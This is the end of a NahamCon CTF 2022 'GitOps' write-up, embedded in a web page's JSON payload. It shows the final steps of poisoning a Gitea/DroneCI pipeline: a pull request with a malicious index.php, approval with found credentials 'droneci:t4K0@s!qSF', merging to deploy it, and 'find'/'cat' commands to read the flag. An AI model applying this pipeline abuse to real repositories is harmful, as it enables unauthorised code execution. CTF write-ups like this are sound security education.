punctuation\",children:\";\"}),`\n`]})}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token php language-php\",children:(0,e.jsx)(n.span,{className:\"token delimiter important\",children:\"?\u003e\"})}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c/\"}),\"pre\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"Repeat previous steps to modify \",(0,e.jsx)(n.code,{children:\"drone.yml\"}),\" but instead change \",(0,e.jsx)(n.code,{children:\"index.php\"}),\", Once the commit is made, you need to ask for a pull request\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/PullRequest.png\",alt:\"Create Pull Request\"})}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"Then Disconnect from the \",(0,e.jsx)(n.em,{children:\"developer\"}),\" account and connect with the credentials founds previously \",(0,e.jsx)(n.code,{children:\"droneci:t4K0@s!qSF\"})]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"We now need to peer review the commit from \",(0,e.jsx)(n.em,{children:\"developer\"}),\" account asking to be merged into master\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/peer_review.png\",alt:\"Approve Commit made by Developer\"})}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:\"Now the final step, we need to actually create a merge commit to the master branch\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/Merge.png\",alt:\"Merged to master branch\"})}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.h3,{id:\"confirm-the-malicious-indexphp-has-been-pushed-to-the-webserver\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#confirm-the-malicious-indexphp-has-been-pushed-to-the-webserver\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Confirm the malicious \",(0,e.jsx)(n.code,{children:\"index.php\"}),\" has been pushed to the webserver\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Now is the final check, Cross your fingers and navigate to \",(0,e.jsx)(n.code,{children:\"Web.challenge.nahamcon.com\"}),\".\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/phpinfo.png\",alt:\"Reverse Shell Testing\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"At first, we thought me might need to find some privilege escalation vulnerability on the web server to gain root access then grab the flag, we create a reverse shell from the Webserver, but after quick enumeration, we found the flag on the system root and were able to read it with user \",(0,e.jsx)(n.code,{children:\"www-data\"}),\". So instead of creating a new reverse shell, you can use \",(0,e.jsx)(n.code,{children:\"find\"}),\" and \",(0,e.jsx)(n.code,{children:\"cat\"}),\" to grab the flag.\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`find / -name *.txt -type f\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`cat /flag.txt\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/find_flag.png\",alt:\"Finding the flag\"}),`\n`,(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/flag.png\",alt:\"Grabbing the Flag\"})]})]})}}var w=b;return v;})();\n;return Component;","toc":[{"value":"GitOps","url":"#gitops","depth":1},{"value":"Challenge Summary","url":"#challenge-summary","depth":2},{"value":"Initial Reconnaissance","url":"#initial-reconnaissance","depth":2},{"value":"Testing for Remote Code Execution","url":"#testing-for-remote-code-execution","depth":2},{"value":"Bonus: How to get command output without webhook","url":"#bonus-how-to-get-command-output-without-webhook","depth":2},{"value":"Getting Reverse shell","url":"#getting-reverse-shell","depth":2},{"value":"Stripped output Response","url":"#stripped-output-response","depth":3},{"value":"Key Points","url":"#key-points","depth":3},{"value":"Generating the payload","url":"#generating-the-payload","depth":3},{"value":"Post Exploitation","url":"#post-exploitation","depth":2},{"value":"Pivoting to Web Server","url":"#pivoting-to-web-server","depth":2},{"value":"Confirm the malicious index.php has been pushed to the webserver","url":"#confirm-the-malicious-indexphp-has-been-pushed-to-the-webserver","depth":3}],"frontMatter":{"readingTime":{"text":"9 min read","minutes":8.945,"time":536700,"words":1789},"slug":"nahamcon-ctf-2022/gitops","fileName":"nahamcon-ctf-2022/gitops.md","title":"NahamCon CTF 2022 – GitOps","date":"2022-05-02T00:00:00.000Z","draft":false,"authors":["TheButcher"],"tags":["NahamCon CTF 2022","Misc","DevOps","Git","Pipeline","Gitea","DroneCI"],"summary":"Abuse the pipeline execution process to gain access to the host."}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.17,"time":10200,"words":34},"slug":["TheButcher"],"fileName":"TheButcher.md","name":"TheButcher","avatar":"https://www.gravatar.com/avatar/711bcc9351488f059a9973474447df76?d=identicon\u0026s=256","specialties":["Misc","OSINT"],"member":true,"retired":true,"description":"Always Try Harder","order":1,"date":null}],"prev":{"title":"Crew CTF 2022 – EzChall \u0026 EzChall Again","date":"2022-04-17T00:00:00.000Z","draft":false,"authors":["elleuch"],"tags":["CREW CTF 2022","Web","SSTI","Filter","WAF","Blacklist"],"summary":"Blind SSTI with filters","slug":"crew-ctf-2022/EzChall"},"next":{"title":"San Diego CTF 2022 – Tasty Crypto Roll","date":"2022-05-10T00:00:00.000Z","draft":false,"authors":["deuterium"],"tags":["SDCTF 2022","Crypto","Cryptography","AES","z3","substitution","permutation"],"summary":"Exploiting the structure of sbox used and finding the inverse substitution mapping using z3.","canonical":"https://deut-erium.github.io/ctf-writeups-2022/ctf2022/sdctf/tasty_crypto_roll/2022-05-10-SDCTF-Tasty-Crypto-Roll","slug":"sdctf-2022/crypto-roll"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["nahamcon-ctf-2022","gitops"]},"buildId":"0wxHpwy3ehtFejYPlY-Z7","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>